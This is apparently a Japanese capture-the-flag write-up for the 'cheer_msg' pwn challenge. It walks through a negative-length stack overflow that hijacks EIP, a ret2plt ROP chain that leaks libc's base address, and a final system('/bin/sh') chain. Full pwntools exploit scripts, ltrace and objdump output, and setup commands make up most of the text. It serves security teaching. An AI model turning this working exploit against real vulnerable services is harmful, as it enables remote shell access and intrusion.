+メッセージ長に-144、名前にABCDを与えてみる。
+ltraceコマンドでは、-iオプションを与えることでeipの表示も行える。攻撃によってリターンアドレスを任意の値に書き換えることができたかどうか確認することができる。
+実行の結果から、最終行でSegmentation faultが起きる。
+この時、eipの値が0x44434241となっている。0x44、0x43、0x42、0x41はそれぞれ文字'D'、'C'、'B'、'A'の文字コードであることから、確かにリターンアドレスを入力した値に書き換え、eipを奪うことが確認できる。
+
+$ ltrace -i ./cheer_msg
+[0x80484d1] __libc_start_main(0x80485ca, 1, 0xffecfb04, 0x8048750 <unfinished ...>
+[0x80485c8] setbuf(0xf7f00d80, 0)                        = <void>
+[0x80485e7] printf("Hello, I'm Nao.\nGive me your che"...Hello, I'm Nao.
+Give me your cheering messages :)
+
+Message Length >> ) = 69
+[0x80486de] fgets(-144
+"-144\n", 64, 0xf7f005c0)              = 0xffecf9dc
+[0x80486f1] strchr("-144\n", '\n')                       = "\n"
+[0x804870b] strlen("-144")                               = 4
+[0x804873c] atoi(0xffecf9dc, 64, 0xf7f1b410, 1)          = 0xffffff70
+[0x804865f] printf("Message >> "Message >> )                        = 11
+[0x80486de] fgets("", -144, 0xf7f005c0)                  = 0
+[0x80486f1] strchr("", '\n')                             = nil
+[0x804870b] strlen("")                                   = 0
+[0x804867d] printf("\nOops! I forgot to ask your name"...
+Oops! I forgot to ask your name...
+Can you tell me your name?
+
+Name >> ) = 72
+[0x80486de] fgets(ABCD
+"ABCD\n", 64, 0xf7f005c0)              = 0xffecfa5c
+[0x80486f1] strchr("ABCD\n", '\n')                       = "\n"
+[0x804870b] strlen("ABCD")                               = 4
+[0x80486aa] printf("\nThank you %s!\nMessage : %s\n", "ABCD", ""
+Thank you ABCD!
+Message :
+) = 28
+[0x44434241] --- SIGSEGV (Segmentation fault) ---
+[0xffffffffffffffff] +++ killed by SIGSEGV +++
+
+eipが0x41424344ではなく0x44434241となっているのは、x86がリトルエンディアンであるため。
+リトルエンディアンでは、値はメモリ上に逆順に格納される。
+
+
+・libcのベースアドレスを求める
+eipを奪って任意のコードに処理を飛ばせれば、次はROPを用いてlibcのベースアドレスを求める。
+ret2pltで適当な関数のGOTからアドレスをリークし、その後はmain関数に戻る。
+
+今回のバイナリ内でリークに使えそうな関数を選ぶ。objdumpコマンドで.pltセクションをのぞく。
+出力に使う関数としてはprintf関数が良い。リークするGOTのエントリは、リークするまでに一度でも使われていればどの関数でもよいが、一番先頭にあったsetbuf関数を使う。
+printf関数を呼ぶためのPLTのアドレスは0x08048430。setbuf関数のlibc内での実体のアドレスが記録されているGOTのアドレスは0x0804a00c。
+
+$ objdump -M intel -j .plt -d cheer_msg
+cheer_msg:     file format elf32-i386
+
+
+Disassembly of section .plt:
+
+08048410 <setbuf@plt-0x10>:
+ 8048410:       ff 35 04 a0 04 08       push   DWORD PTR ds:0x804a004
+ 8048416:       ff 25 08 a0 04 08       jmp    DWORD PTR ds:0x804a008
+ 804841c:       00 00                   add    BYTE PTR [eax],al
+        ...
+
+08048420 <setbuf@plt>:
+ 8048420:       ff 25 0c a0 04 08       jmp    DWORD PTR ds:0x804a00c
+ 8048426:       68 00 00 00 00          push   0x0
+ 804842b:       e9 e0 ff ff ff          jmp    8048410 <_init+0x28>
+
+08048430 <printf@plt>:
+ 8048430:       ff 25 10 a0 04 08       jmp    DWORD PTR ds:0x804a010
+ 8048436:       68 08 00 00 00          push   0x8
+ 804843b:       e9 d0 ff ff ff          jmp    8048410 <_init+0x28>
+以下略
+
+また、main関数は0x080485caに存在していることは既に判明している。
+これらの情報を用いてexploitを書いていく。setbuf関数のlibc内でのオフセットは、system関数のオフセットを調べたのと同様にして求めることができる。
+
+ROPを組んでいく。
+本来のリターンアドレスが配置されているはずの場所に適当な関数のアドレスを置くことで、任意の処理を呼び出すことが可能になる。ここではそれをprintf関数とした。その際に、次の1wordはprintf関数のリターンアドレス、さらに次の1wordは第1引数として扱われる。
+
+rop  = p32(addr_plt_printf)
+rop += p32(addr_main)
+rop += p32(addr_got_setbuf)
+
+したがって、このROP chainは次のような処理を行う。
+
+1.setbuf関数のGOTを第1引数としてprintf関数に戻る(呼ばれる)
+2.printf関数の処理が終わるとmain関数に戻る(呼ばれる)
+
+GOTのsetbuf関数のエントリからデータを読み出すと、数バイトの連続したデータがリークする。
+これは、ヌル終端していないために文字列が続いていると認識されるため。
+しかし、必要なのは先頭の4byteだけなので、その分だけ読み込んであとは捨てる。
+
+$ pip install pwntools
+
+[exploit_cheer_msg_leak.py]
+#! /usr/bin/env python
+from pwn import *
+
+rhp = {'host':"localhost", 'port':30527}
+
+context(os = 'linux', arch = 'i386')
+
+addr_plt_printf    = 0x08048430
+addr_got_setbuf    = 0x0804a00c
+addr_main          = 0x080485cb
+
+offset_libc_setbuf = 0x00067b20
+
+#==========
+
+def attack(conn):
+        rop  = p32(addr_plt_printf)
+        rop += p32(addr_main)
+        rop += p32(addr_got_setbuf)
+
+        conn.recvuntil('Message Length >> ')
+        conn.sendline(str(-144))
+        conn.recvuntil('Name >> ')
+        conn.sendline(rop)
+        conn.recvuntil('Message : \n')
+
+        addr_libc_setbuf     = u32(conn.recv(4))
+        addr_libc_base       = addr_libc_setbuf - offset_libc_setbuf
+        info('addr_libc_base = 0x%08x' % addr_libc_base)
+
+#==========
+
+if __name__ == '__main__':
+        conn = remote(rhp['host'], rhp['port'])
+        attack(conn)
+        conn.interactive()
+
+#==========
+
+実行すると、以下のようにlibcのベースアドレスが求まる。
+この時、下位3nibbleが0である(0x1000byteアラインされている)ことから、正しくベースアドレスが求められていると考えて差し支えない。
+
+
+$ socat -v tcp-listen:30527,fork,reuseaddr exec:./cheer_msg,stderr
+$ python exploit_cheer_msg_leak.py
+
+pening connection to localhost on port 30527: Done
+[*] addr_libc_base = 0xf7d06db0
+[*] Switching to interactive mode
+ gf\x84\x0m]Hello, I'm Nao.
+Give me your cheering messages :)
+
+Message Length >> $
+
+
+pwntoolsを使って自動化する
+pwntoolsにはこれらのシンボルを解決し、さらには自動でROP chainを組んでくれる機能が存在する。これを使うと、先のコードは次のように書ける。
+
+binf_rop.printf(addr_got_setbuf)
+binf_rop.main()
+
+
+[exploit_cheer_msg.py]
+#! /usr/bin/env python
+from pwn import *
+
+rhp = {'host':"localhost", 'port':30527}
+
+context(os = 'linux', arch = 'i386')
+
+binf = ELF('./cheer_msg')
+addr_got_setbuf = binf.got['setbuf']
+
+libc = ELF('./libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368')
+offset_libc_setbuf = libc.symbols['setbuf']
+
+#==========
+
+def attack(conn):
+        binf_rop = ROP(binf)
+        binf_rop.printf(addr_got_setbuf)
+        binf_rop.main()
+
+        conn.recvuntil('Message Length >> ')
+        conn.sendline(str(-144))
+        conn.recvuntil('Name >> ')
+        conn.sendline(str(binf_rop))
+        conn.recvuntil('Message : \n')
+
+        addr_libc_setbuf     = u32(conn.recv(4))
+        libc.address         = addr_libc_setbuf - offset_libc_setbuf
+        info('addr_libc_base = 0x%08x' % libc.address)
+
+#==========
+
+if __name__ == '__main__':
+        conn = remote(rhp['host'], rhp['port'])
+        attack(conn)
+        conn.interactive()
+
+#==========
+
+
+この機能を使うためには、あらかじめELFファイルを読み込んでおくことが必要になる。
+ROP以外の処理に関しては、そのまま手を加えずに問題ない。
+
+
+・シェルの軌道
+system関数の位置も判明したため、あとは呼ぶだけ。
+ただし、引数を忘れてはいけない。文字列"/bin/sh"が格納されているアドレスを確実にsystem関数に渡してやらなければシェルを起動できない。
+この文字列は、問題バイナリの中には含まれていない。この文字列はlibc内の関数からも頻繁に使われており、そのためlibcの.rodata(Read Only DATA)セクションに格納されている。
+
+文字列が格納されているアドレス(オフセット)は、stringsコマンドに-txオプションを付けることで調べることができる。"/bin/sh"はオフセット0x0016084cに格納されている。
+
+$ strings -tx libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368 | grep /bin/sh
+ 16084c /bin/sh
+
+これも手動で調べずpwntoolsの機能で求めることが可能。
+
+
+[exploit_cheer_msg.py]
+#! /usr/bin/env python
+from pwn import *
+
+rhp = {'host':"localhost", 'port':30527}
+
+context(os = 'linux', arch = 'i386')
+
+binf = ELF('./cheer_msg')
+addr_got_setbuf = binf.got['setbuf']
+
+libc = ELF('./libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368')
+offset_libc_setbuf = libc.symbols['setbuf']
+
+#==========
+
+def attack(conn):
+        binf_rop = ROP(binf)
+        binf_rop.printf(addr_got_setbuf)
+        binf_rop.main()
+
+        conn.recvuntil('Message Length >> ')
+        conn.sendline(str(-144))
+        conn.recvuntil('Name >> ')
+        conn.sendline(str(binf_rop))
+        conn.recvuntil('Message : \n')
+
+        addr_libc_setbuf     = u32(conn.recv(4))
+        libc.address         = addr_libc_setbuf - offset_libc_setbuf
+        info('addr_libc_base = 0x%08x' % libc.address)
+	addr_libc_str_sh     = next(libc.search('/bin/sh'))
+
+	libc_rop = ROP(libc)
+	libc_rop.system(addr_libc_str_sh)
+	libc_rop.exit(0)
+
+	conn.recvuntil('Message Length >> ')
+	conn.sendline(str(-144))
+	conn.recvuntil('Name >> ')
+	conn.sendline(str(libc_rop))
+	conn.recvuntil('Message : \n')
+
+#==========
+
+if __name__ == '__main__':
+        conn = remote(rhp['host'], rhp['port'])
+        attack(conn)
+        conn.interactive()
+
+#==========
+
+以上でexploitの完成。system関数から起動されたシェルを終了した後は、exit関数でも呼んで攻撃を終える。
+
+
+・実際に攻撃してシェルを奪う
+完成したexploitを使って、実際にシェルを奪取してみる。
+問題は環境。本番ではUbuntu 14.04で実行されており、配布されたlibcも出題時における最新のものだった。
+利用したいlibcと問題バイナリがカレントにある状態で、以下のように実行することでこのlibcを用いてバイナリを動かすことができる。
+
+$ LD_PRELOAD=./libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368 ./cheer_msg
+
+しかし、環境によってはSegmentation faultを引き起こして動作しない場合も考えられる。
+その時は、本番環境と同一のUbuntu 14.04を用意するか、提供されたlibcを用いることはあきらめて自身の環境のlibcをそのまま用いて取り組むようにする。
+後者の場合、exploitのlibc = ELF('./libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368')の部分を改変する必要がある。
+
+lddコマンドを用いて使用環境で使用しているlibcのフルパスを調べる。
+
+$ ldd cheer_msg
+
+調べたlibcのパスを用いて、exploitで使用するlibcを変更する。
+これでシェルを奪えている様子が確認できる。
+
+
+
